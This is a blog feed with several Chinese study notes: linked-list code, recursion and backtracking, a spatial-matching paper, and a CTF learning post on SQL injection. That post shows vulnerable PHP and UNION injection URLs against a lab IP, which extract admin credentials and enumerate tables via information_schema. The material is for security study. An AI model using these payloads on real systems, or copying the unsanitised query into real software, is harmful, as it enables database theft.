title="在尾部删除节点"></a>在尾部删除节点</h6><p>删除尾元节点，比删除首元节点稍微复杂一点，具体分为三步。</p><ul><li>遍历链表，直到找到尾元节点。注意在这个过程中需要始终保持当前所指结点和其前驱节点的地址。也就是说，我们需要定义两个临时变量来储存地址。</li><li>置尾元节点的前驱节点右指针域为空。</li><li>删除当前所指结点&#x2F;尾元节点。</li></ul><h6 id="在中间删除节点"><a href="#在中间删除节点" class="headerlink" title="在中间删除节点"></a>在中间删除节点</h6><p>我们一样分为两步。</p><ul><li>与删除尾元节点类似，在遍历期间始终保存当前节点的前驱节点地址。一旦找到了需要删除的节点，就通过修改其前驱节点的右指针使其指向所指结点的右指针域下一个节点，再修改所指结点的下一个指向元素左指针域使其指向被删除节点的前驱节点。</li><li>释放所指结点</li></ul><p>下面是实现的代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">DLLNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DLLDelete</span><span class="params">(<span class="keyword">struct</span> DLLNode **head,<span class="type">int</span> position)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span> *<span class="title">temp1</span>,*<span class="title">temp2</span>,*<span class="title">temp</span>=</span>*head;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(*head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;<span class="comment">//如果删除的是首节点</span></span><br><span class="line">        *head=(*head)-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(*head!=<span class="literal">NULL</span>)</span><br><span class="line">            (*head)-&gt;prev=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((k&lt;position)&amp;&amp;temp-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k!=position<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Desired position does not exist.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    temp2=temp-&gt;prev;</span><br><span class="line">    temp2-&gt;next=temp-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(temp-&gt;next)<span class="comment">//如果删除的是中间的一个点</span></span><br><span class="line">        temp-&gt;next-&gt;prev=temp2;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h4><p>循环链表和前面的两种形式不同，它没有NULL指针域，即每个节点都有其后继节点。在循环链表中，头节点可以访问其所有链表。当几个进程正在轮流使用相同的计算机资源相同的时间时，我们必须确保在它们完成前没有其他进程访问该资源（轮询算法）。下面是一个循环链表的类型声明。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CLLNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CLLNode</span>* <span class="title">Next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300470.jpg" alt="300470"></p>]]></content>
    
    
    <summary type="html">关于链表的知识笔记</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="链表" scheme="http://example.com/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTFer的苦痛之路——SQL注入篇</title>
    <link href="http://example.com/2023/09/18/CTFer%E7%9A%84%E8%8B%A6%E7%97%9B%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>http://example.com/2023/09/18/CTFer%E7%9A%84%E8%8B%A6%E7%97%9B%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2023-09-18T08:33:20.000Z</published>
    <updated>2023-10-17T15:40:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>作为网安的学生，不系统的学习一下CTF比赛，真是有点愧对这个专业了。然而CTF这条路必定道阻且长，实践性极强而且门槛参差不齐，且缺乏系统的入门学习方法。过了一年了，从一开始的编程零基础到现在掌握了一些必要的编程技巧，终于打算仔细钻研一下CTF了。</p><p>我用的书本是《从0到1 CTFer成长之路》，不用说，听书名就觉得这劲度不下与苦痛之路口牙。总之姑且就先这么开干了，也许后续还会参考一些其他比赛或者靶场的题目以及CTF Wiki。</p><p>另外，由于个人原因，并不会按照书上的编排顺序进行学习。一是兴趣方向所需，二是有一些知识点暂时还理解不了……（比如git泄露我连git都还没学啊喂）（我是蒻笱）</p><p>那么 <font color="red"  size="10px">CTF 启动！！！</font></p><hr><p>如上文提到的，关于CTF的知识学习由我个人兴趣决定。那么我们就先来试试SQL注入。</p><p>SQL注入……理论上需要一定的PHP和MySQL基础，然而两个我都还没学（别骂了），所以注定是困难重重，学习效果如何也不敢保证。暑假的时候听了听学校夏令营，感觉有了点眉目，然而还是写不出来题目（SQL语句太长了记不住……）。无论如何，还是先开始吧。</p><h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><p>web应用开发中，为了内容快速更新，很多开发者把数据放在数据库中进行储存。但是由于开发者对用户数据传入的过滤不严格，可能将攻击载荷拼接到正常的SQL查询语句中，再将这些查询语句交由后端的数据库里执行，从而引发和预期功能不一致的语句，我们称之为<strong>SQL注入</strong>。这通常将导致数据库的信息泄露、篡改甚至删除。这里我们将介绍几种常见的SQL注入类型，包括<strong>数字型注入、UNION注入&#x2F;联合注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</strong>。</p><h3 id="数字型注入和UNION注入"><a href="#数字型注入和UNION注入" class="headerlink" title="数字型注入和UNION注入"></a>数字型注入和UNION注入</h3><p>借用书上的例题，我们先给出第一个例子的PHP代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接本地MySQL,数据库为test</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_ <span class="title function_ invoke__">connect</span>(<span class="string">&quot;127.0.0.1&quot;</span> <span class="string">&quot;root&quot;</span> , <span class="string">&quot;root&quot;</span> , <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//查询wp_news表的title、content字段，id为GET输入的值</span></span><br><span class="line"><span class="variable">$res</span> = mlysqli. <span class="title function_ invoke__">_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT title, content FROM wp_news WHERE id=&quot;</span> .$. GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//说明:代码和命令对于SQL语句不区分大小写，书中为了让读者清晰表示，对于关键字采用大写形式</span></span><br><span class="line"><span class="comment">//将查询到的结果转化为数组</span></span><br><span class="line"><span class="variable">$row</span> = mysqli _fetch. <span class="keyword">array</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//输出结果中的title字段值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>. <span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>]. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//输出结果中的content字段值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>. <span class="variable">$row</span>[ <span class="string">&#x27;content&#x27;</span>]. <span class="string">&quot;&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数据库的表结构见图1-1，新闻表wp_news的内容见图1-2，用户wp_user的内容见图1-3。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918142004.png" alt="img"></p><center>图1-1</center><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918142133.png" alt="img"></p><center>图1-2</center><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017233825699.png" alt="image-20231017233825699"></p><center>图1-3</center><p>顺便给定一个目标网址<code>http://192.168.20.133/sql1.php</code>，然而这个网址是打不开的，我也不知道为什么。</p><p>那么本节的目标就是通过HTTP的GET函数来获取输入的id值，将本应该查询新闻表的功能转变为查询admin（通常是管理员）的账号和密码（密码通常是hash值，这里为了演示就变成明文this_is_the_admin_password）。获取管理员账户和密码后，入侵者可以通过它登录网站后台，从而控制整个网站内容。</p><p>首先我们访问<code>http://192.168.20.133/sql1.php?id=1</code>，结果如下图1-4。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918143049.png" alt="img"></p><center>图1-4</center><p>这里运用到了GET请求发送了一个id为1的参数，最后得到的结果与新闻表wp_news中第一行id为1的结果一致。事实上，PHP将GET方法传入的<code>id=1</code>与前面的SQl语句进行了拼接，原查询语句如下。</p><p><code>$res = mysqli _query($conn, &quot;SELECT title, content FROM wp_news WHERE id=&quot;.$_GET[&#39;id&#39;]);</code></p><p>在收到<code>id=1</code>后，<code>.$_GET[&#39;id&#39;]</code>被赋值为1，最后传递给MySQL的查询语句如下。</p><p><code>SELECT title, content FROM wp_news WHERE id = 1</code></p><p>值得注意的是MySQL对大小写不敏感，这里将关键字大写是为了方便理解。</p><p>下面开始通过用户输入id参数来进行SQL注入攻击。</p><p>首先我们访问链接<code>http://192.168.20.133/sql1.php?id=2</code>，也就是传入<code>id=2</code>，得到结果如图1-5的id为2的记录，再传递参数<code>id=3-1</code>，仍然可以得到<code>id=2</code>的记录。说明MySQL对<code>3-1</code>的表达式进行了计算结果为2，然后查询id&#x3D;2的记录。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918150132.png" alt="img"></p><center>图1-5</center><p>这个行为基本可以判断该注入点为<strong>数字型注入</strong>，表现为<code>$_GET[&#39;id&#39;]</code>附近没有引号包裹。这时我们可以直接输入SQL查询语句来干扰正常的查询。</p><p><code>SELECT title, content FROM wp_news WHERE id = 1 UNION SELECT user, pwd FROM wp_user</code></p><p>这个SQL语句的作用是查询新闻表中id&#x3D;1时对应行的title和content字段的数据，并且联合查询用户表中的user、pwd。union关键字会对两个结果集进行并行查询。</p><p>我们通过网页访问时只需要输入id后面的内容，即访问链接<code>http://192.168.20.133/sql1.php?id=1 union select user, pwd from wp_user</code>。注意，在浏览器中空格会被转化为<code>%20</code>，这是空格的URL编码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918153720.png" alt="img"></p><center>图1-6</center><p>但是如图1-6所示，网页并没有按照预期显示用户和密码的内容，事实上MySQL确实查询出了两条记录，但因为PHP限制该页面只能显示一条内容，所以我们需要将账号密码的记录显示在查询结果第一行。有几种实现方式，比如在原有数据后加上<code>limit 1,1</code>参数（显示查询结果后的第二条记录）。又或者指定<code>id=-1</code>或者一个很大的值，第一行记录无法被查询到，这样结果就可以只显示第二条记录了。</p><p>那么我们访问<code>http://192.168.20.133/sql1.php?id=-1 union select user, pwd from wp_user</code>成功得到了图1-7所示的用户表的账号和密码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918155116.png" alt="img"></p><center>图1-7</center><p>以上这种通过UNION语句将数据显示到页面上的注入方法为<strong>UNION注入&#x2F;联合注入</strong>。是最为简单也是最基础的注入方法，因为该数据库没有设置任何关于数据的过滤方式。我们后续学习的注入方法大多也基于这种思路，不过要尝试绕过所设置的过滤（也许是吧）。</p><p>但是以上的例子是默认我们已经知道了数据库结构，在测试情况下，我们要如何知道数据表的字段名pwd和表名wp_user呢？</p><p>答案是information_schema。MySQL5.0版本后，默认自带一个数据库information_schema，储存着MySQL的所有数据库名、表名、字段名。虽然引入这个库是方便数据库信息的查询，但是客观上却大大方便了SQL注入（乐）。</p><p>接下来演示实战的操作过程。</p><p>假设我们并不知道数据库的相关信息，首先通过<code>id=2</code>和<code>id=3-1</code>回显一致判断这存在一个数字型注入，然后通过联合查询，查到本数据库和其他所有表名。访问<code>http://192.168.20.133/sql1.php?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code>。结果见图1-8。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017233946704.png" alt="image-20231017233946704"></p><center>图1-8</center><p>让我们看看这么长一串玩意到底执行了个啥。information_schema包含了MySQL中所有的数据库名、表名、字段名，其中的table表就是储存数据库所有表名的一个表，而table_name是table表的表名字段，后面跟所有表的名字。table表中还包含数据库名字段table_schema，database()函数返回的内容是当前数据库的名称，group_concat()函数则是用“,”来联合多行记录的函数。</p><p>也就是说，该语句可以查询数据库中所有表名并显示在一个字段中。如下图1-9所示。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017233959278.png" alt="image-20231017233959278"></p><center>图1-9</center><p>更详细的ChatGPT解释附在下方。</p><blockquote><p>当解释这条SQL语句中的关键字时，我会一一说明它们的作用：</p><ol><li><code>union</code>: 在SQL中，<code>UNION</code>操作符用于合并两个或多个<code>SELECT</code>语句的结果集。它将多个查询的结果合并在一起，并以一个单一的结果集返回。</li><li><code>select</code>: <code>SELECT</code>关键字用于从数据库表中检索数据。在这种情况下，<code>SELECT</code>用于选择查询结果中需要显示的列。</li><li><code>1</code>: 这是一个常量值，表示第一个查询结果集中的一列。在这种情况下，它用作占位符，因为<code>UNION</code>操作要求所有查询具有相同数量和类型的列。</li><li><code>group_concat</code>: <code>GROUP_CONCAT</code>是MySQL中的聚合函数之一。它用于将多个行的某一列值连接成一个单独的字符串。在这里，它用于将<code>table_name</code>列中的表名连接成一个字符串。</li><li><code>table_name</code>: <code>table_name</code>是<code>information_schema.tables</code>视图中的一个列名。该列包含了数据库中的表名信息。</li><li><code>information_schema.tables</code>: <code>information_schema</code>是MySQL系统数据库之一，其中包含关于数据库、表、列和其他数据库对象的元数据信息。<code>tables</code>是<code>information_schema</code>中的一个表，包含有关数据库中表的信息。</li><li><code>where</code>: <code>WHERE</code>关键字用于指定查询的条件。在这种情况下，<code>where table_schema=database()</code>用于过滤只返回当前数据库中的表。</li></ol><p>通过结合使用这些关键字和语句，攻击者可以利用注入漏洞执行恶意查询，并从<code>information_schema.tables</code>表中提取表名信息。</p></blockquote><p>同理，通过columns表中的column_name查询出的内容即为wp_user中的字段名，访问<code>http://192.168.20.133/sql1.php？id=-1 union select 1 ,group_concat (column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code>，可以得到对应的字段名。见图1-10。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017234009782.png" alt="image-20231017234009782"></p><center>图1-10</center><p>至此，第一个例子结束。数字型注入的<strong>关键</strong>在于找到输入的参数点，然后通过加减乘除等运算判断参数附近有无引号包裹，再通过一些常见的攻击手段（比如联合注入，在此之前先尝试获得表名），获取数据库的敏感信息。</p><h3 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h3><hr><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2062841026_p0.png" alt="复件 62841026_p0"></p>]]></content>
    
    
    <summary type="html">关于CTF的SQL的一些知识点</summary>
    
    
    
    <category term="CTF苦痛之路" scheme="http://example.com/categories/CTF%E8%8B%A6%E7%97%9B%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（一）——绪论、递归与回溯.md</title>
    <link href="http://example.com/2023/09/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E7%BB%AA%E8%AE%BA%E3%80%81%E9%80%92%E5%BD%92%E4%B8%8E%E5%9B%9E%E6%BA%AF/"/>
    <id>http://example.com/2023/09/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E7%BB%AA%E8%AE%BA%E3%80%81%E9%80%92%E5%BD%92%E4%B8%8E%E5%9B%9E%E6%BA%AF/</id>
    <published>2023-09-17T14:21:24.000Z</published>
    <updated>2023-10-17T16:00:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>关于我自己阅读《数据结构与算法经典问题解析》的一点小笔记与想法。不定时更新，不保证能完结~﻿ε≡٩(๑&gt;₃&lt;)۶ </p><hr><h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>粗略浏览了一下绪论部分，主要介绍了如何计算算法的时间复杂度。涉及到比较多的数学计算，这里暂且先按下不表，还是多看书上的例题自己总结来得快吧。</p><h2 id="递归和回溯"><a href="#递归和回溯" class="headerlink" title="递归和回溯"></a>递归和回溯</h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>函数自己调用自己，我们称之为<strong>递归</strong>。递归让函数得以通过调用自身的一个小副本来求解小问题的方法去解决大问题。</p><p>比较经典的利用递归去解决的问题：</p><ul><li>裴波那契数列，数的阶乘</li><li>合并排序，快速排序</li><li>二分搜索</li><li>树的遍历</li><li>图的遍历</li><li>动态规划</li><li>分治算法</li><li>汉诺塔问题</li><li>回溯算法</li></ul><h4 id="递归的格式"><a href="#递归的格式" class="headerlink" title="递归的格式"></a>递归的格式</h4><p>一般来说，函数会遇到一个不需要调动自身就可以解决的子问题，我们称之为<strong>基本情况</strong>，与之相对的，一个需要调动自己来解决的问题，我们称之为<strong>递归情况</strong>。我们可以参考以下格式来编写递归函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (是基本情况吗)</span><br><span class="line">    直接求解，并返回结果</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (是另一种基本情况吗)</span><br><span class="line">    直接求解，并返回结果</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//即递归情况</span></span><br><span class="line">    返回（进行某些处理步骤，然后是针对更小规模问题的函数调用）</span><br></pre></td></tr></table></figure><p>比如我们现在用C语言去实现一个计算数的阶乘的递归函数，函数编写如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Fact</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n*Fact(n<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="递归与迭代"><a href="#递归与迭代" class="headerlink" title="递归与迭代"></a>递归与迭代</h4><p>我们一般总会面临一个选择，是使用递归好还是迭代更好。一般来说，迭代使一个问题变得简单，但是它会产生额外的开销（使用了大量的系统栈中的空间）</p><p>一般来说递归的特点如下：</p><ul><li>当到达基本情况时，递归终止</li><li>每次调用递归会占用内存空间</li><li>如果递归无法终止，会造成内存耗尽或系统栈溢出</li><li>运用递归的方法更加容易求解一些问题</li></ul><p>而迭代的特点如下：</p><ul><li>当迭代的证明不成立时，迭代终止</li><li>每次迭代不需要额外空间，因为使用的是同一片形参，只需要更新储存的值就好</li><li>因为循环过程不会产生额外的内存开销，所以无限循环可以无限的进行下去</li><li>一个问题的迭代方案可能不一定有递归方案那么显而易见</li></ul><h3 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h3><p>回溯法是一种利用分治算法的穷举搜索方法。</p><ul><li>有时解决问题的最好算法是尝试所有的可能性</li><li>有时候这种算法的效率并不高，但有一些工具来改善这些算法</li><li>回溯法通过剪枝技术加快穷举搜索的速度</li></ul><p>应用回溯法算法举例如下：</p><ul><li>二进制串：生成所有的二进制串</li><li>生成k进制串</li><li>背包问题</li><li>广义字符串</li><li>图着色问题</li></ul><p>这里放一道例题，要求生成所有长度为k的字符串，并且应用了回溯算法。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* A;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Binary</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, A);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">A[n - <span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">Binary(n - <span class="number">1</span>);</span><br><span class="line">A[n - <span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">Binary(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">A = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">A[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Binary(n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我出于个人兴趣加上了个count来计算一共产生了多少个二进制数。其实不难猜测，count的值即为2的n次方。当n为20时，count为2^20^即1,048,576。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要学习了递归、迭代与回溯算法的利用。绪论部分关于时间复杂度和空间复杂度的计算一定要重点掌握，限于篇幅没有放在博客上，请自行线下阅读。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300431.jpg" alt="300431"></p>]]></content>
    
    
    <summary type="html">关于数据结构的一些个人自学随笔</summary>
    
    
    
    <category term="数据结构学习" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="数据结构" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>关于高效空间匹配Efficiency Spatial Matching的一些理解</title>
    <link href="http://example.com/2023/09/17/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%85%B3%E4%BA%8E%E9%AB%98%E6%95%88%E7%A9%BA%E9%97%B4%E5%8C%B9%E9%85%8DEfficiency-Spatial-Matching%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <id>http://example.com/2023/09/17/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%85%B3%E4%BA%8E%E9%AB%98%E6%95%88%E7%A9%BA%E9%97%B4%E5%8C%B9%E9%85%8DEfficiency-Spatial-Matching%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</id>
    <published>2023-09-17T14:20:52.000Z</published>
    <updated>2023-10-17T15:48:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h2><p><em>Spatial matching</em>(SPM)，就是假定在任意度量空间中存在两个数据集O和P。O是客户的集合，P是服务提供者的集合，且拥有能够支持客户的最大上限（也就是说P的承载客户服务量有限制）。SPM能够将每一个用户分配至离它最近且还有余力承载客户服务的服务提供者。现在已经开发出了一个通过计算线性数*O(|P|+|O|})*的一个算法来实现SPM。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="双色反向最近邻-bichromatic-reverse-nearest-neighbor-BRNN的特点与不足"><a href="#双色反向最近邻-bichromatic-reverse-nearest-neighbor-BRNN的特点与不足" class="headerlink" title="双色反向最近邻&#x2F;bichromatic reverse nearest neighbor,BRNN的特点与不足"></a>双色反向最近邻&#x2F;bichromatic reverse nearest neighbor,BRNN的特点与不足</h3><p>bichromatic reverse nearest neighbor,BRNN是一种用于在双色点集中找到在另一色点集中的最近邻的算法。其中一个点集是查询点集，另一个点集是数据点集。BRNN的目标是为查询点集中的每个点找到数据点集中距离最近的点。在空间数据库中已经被广泛研究过。</p><p>也就是说，在同一片空间中，给定两个数据集<em>O</em>和<em>P</em>，BRNN查询可以找到距离点p为最近点的所有点o（o、p分别属于数据集<em>O</em>、<em>P</em>），即不存在点p’使得o到p’的距离要短于o到p之间的距离。</p><p>打个比方，BRNN的一个最典型的应用就是“寻找最佳服务”。如下图所示，给定数据集<em>O、P</em>，其中分别包含三个住宅地o<del>1</del>o<del>2</del>o<del>3</del>和三个投票地点p<del>1</del>p<del>2</del>p<del>3</del>。</p><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230917202449.png"></p><p>要确定哪些投票点服务哪些住宅区，可以很容易运用BRNN检索法来判断p<del>1</del>应该服务所有的o<del>i</del>点，而p<del>2</del>p<del>3</del>什么都不用干。因为显然p<del>1</del>距离这三个住宅区都最近。</p><p>然而很遗憾，这样分配并没有考虑到每个服务站都有“投票能力”这个事实。事实上每个服务站都有服务人数上限，参考图中b部分。当p<del>1</del>服务所有的住宅区时，客户人数将超出服务站的服务人数上限。</p><p>显然此时单单应用BRNN技术是不行的，这个时候我们就需要使用到SPM技术。</p><h3 id="Spatial-Matching技术"><a href="#Spatial-Matching技术" class="headerlink" title="Spatial Matching技术"></a>Spatial Matching技术</h3><p>SPM可以被视作为进阶版的BRNN技术。对上例应用SPM，可得到分配结果如下：{(<em>p<del>1</del></em>,o<del>1</del>),(p<del>1</del>,o<del>2</del>),(p<del>2</del>,o<del>3</del>)}。因为p<del>1</del>满员了，所以用p<del>2</del>来代替去服务o<del>3</del>。</p><p>要理解SPM技术是如何工作的，可以用以下两种技术进行说明。每一种都很好理解。</p><h4 id="closes-pair-最近点对算法"><a href="#closes-pair-最近点对算法" class="headerlink" title="closes pair&#x2F;最近点对算法"></a>closes 